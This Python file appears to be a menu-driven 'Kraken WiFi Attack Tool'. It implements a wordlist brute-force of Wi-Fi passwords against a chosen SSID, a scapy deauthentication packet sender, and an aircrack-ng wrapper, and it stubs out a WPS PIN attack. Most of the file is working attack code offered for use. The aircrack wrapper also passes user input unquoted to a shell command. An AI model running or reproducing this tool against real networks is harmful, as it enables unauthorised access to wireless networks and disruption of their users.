import os
import sys
import time
import click
import logging
from scapy.all import Dot11, RadioTap, sendp
from pywifi import PyWiFi, const, Profile
from random import choice


log_dir = os.path.join('..', 'Logs')
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, "kraken_wifi_attack.log")
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
script_dir = os.path.dirname(os.path.abspath(__file__))

try:
    from colorama import Fore, Style, init
    import pyfiglet
except ImportError as e:
    missing_module = str(e).split("named ")[-1]
    print(f"{Fore.RED}The required module '{missing_module}' is not installed.")
    print(f"{Fore.YELLOW}Please install all dependencies using pip install -r requirements.txt.")
    sys.exit(1)

init(autoreset=True)

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the script banner with random color."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken WiFi Attack Tool")
    print(banner_color + banner)

def prompt_user_input(prompt):
    """Prompts user for input."""
    return input(prompt).strip()

def write_to_file(filename, content):
    """Writes content to a file."""
    results_dir = os.path.join('..', 'Results')
    if not os.path.exists(results_dir):
        os.makedirs(results_dir)
    with open(os.path.join(results_dir, filename), 'a') as f:
        f.write(content + "\n")

@click.group()
def cli():
    clear_console()
    display_banner()

@cli.command()
def main_menu():
    """Main menu for selecting an attack option."""
    click.echo(Fore.WHITE + "Select an option:")
    click.echo("1. bruteforce - Perform a dictionary attack on the target WiFi network")
    click.echo("2. deauth - Send deauthentication packets to the target access point")
    click.echo("3. wps - Perform a PIN bruteforce attack on a WPS-enabled WiFi network")
    click.echo("4. aircrack - Start a brute-force attack using Aircrack-ng")

    choice = click.prompt("Enter your choice (1/2/3/4)", type=int)

    if choice == 1:
        bruteforce()
    elif choice == 2:
        deauth()
    elif choice == 3:
        wps()
    elif choice == 4:
        aircrack_attack()

@cli.command()
def aircrack_attack():
    """Performs a brute-force attack using Aircrack-ng."""
    pcap_file = prompt_user_input("Enter the path to the capture file (.cap): ")
    wordlist = prompt_user_input("Enter path to the wordlist file (or press Enter to use default 'wordlists/wifi_wordlists.txt'): ") or os.path.join(script_dir, "..", "wordlists", "wifi_wordlists.txt")
    output_file = "aircrack_results.txt"
    
    if os.path.exists(pcap_file) and os.path.exists(wordlist):
        command = f"aircrack-ng {pcap_file} -w {wordlist} > {os.path.join('..', 'Results', output_file)}"
        os.system(command)
        write_to_file(output_file, "Aircrack-ng attack executed.")
        logging.info("Aircrack-ng attack executed with pcap file: %s and wordlist: %s", pcap_file, wordlist)
    else:
        click.echo(Fore.RED + "Invalid file paths. Please check and try again.")
        logging.error("Invalid file paths. Pcap file: %s, Wordlist: %s", pcap_file, wordlist)

@cli.command()
def deauth():
    """Sends deauthentication packets to the target access point."""
    target_mac = prompt_user_input("Enter target MAC address: ")
    interface = prompt_user_input("Enter network interface (default: wlan0): ") or "wlan0"

    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2='FF:FF:FF:FF:FF:FF', addr3=target_mac)
    sendp(packet, iface=interface, verbose=0)
    result_message = f"Deauthentication packets sent to {target_mac}"
    click.echo(Fore.GREEN + result_message)
    write_to_file("deauth_results.txt", result_message)
    logging.info("Deauthentication packets sent to MAC address: %s", target_mac)

@cli.command()
def bruteforce():
    """Performs a dictionary attack on the target WiFi network."""
    target_ssid = prompt_user_input("Enter target SSID: ")
    wordlist = prompt_user_input("Enter path to the wordlist file (or press Enter to use default 'wordlists/wifi_wordlists.txt'): ") or os.path.join(script_dir, "..", "wordlists", "wifi_wordlists.txt")
    
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]  
    profile = Profile()  
    profile.ssid = target_ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.key = None

    output_file = "bruteforce_results.txt"
    write_to_file(output_file, f"Starting brute-force attack on {target_ssid}")
    logging.info("Starting brute-force attack on SSID: %s", target_ssid)

    if os.path.exists(wordlist):
        with open(wordlist, 'r') as f:
            for password in f.read().splitlines():
                profile.key = password
                iface.remove_all_network_profiles()  
                iface.add_network_profile(profile)
                iface.connect(iface.add_network_profile(profile))
                time.sleep(5)  
                if iface.status() == const.IFACE_CONNECTED:
                    success_message = f"Success! Password is: {password}"
                    click.echo(Fore.GREEN + success_message)
                    write_to_file(output_file, success_message)
                    logging.info("Brute-force success! Password found: %s", password)
                    break
                iface.disconnect()
    else:
        click.echo(Fore.RED + "Invalid wordlist path. Please check and try again.")
        logging.error("Invalid wordlist path: %s", wordlist)

@cli.command("wps")
def wps():
    """Performs a PIN bruteforce attack on a WPS-enabled WiFi network."""
    target_mac = prompt_user_input("Enter target MAC address: ")
    click.echo(Fore.YELLOW + "WPS PIN bruteforce attack is not yet implemented.")
    write_to_file("wps_results.txt", "WPS attack not implemented.")
    logging.warning("WPS PIN bruteforce attack is not yet implemented.")

if __name__ == "__main__":
    main_menu()
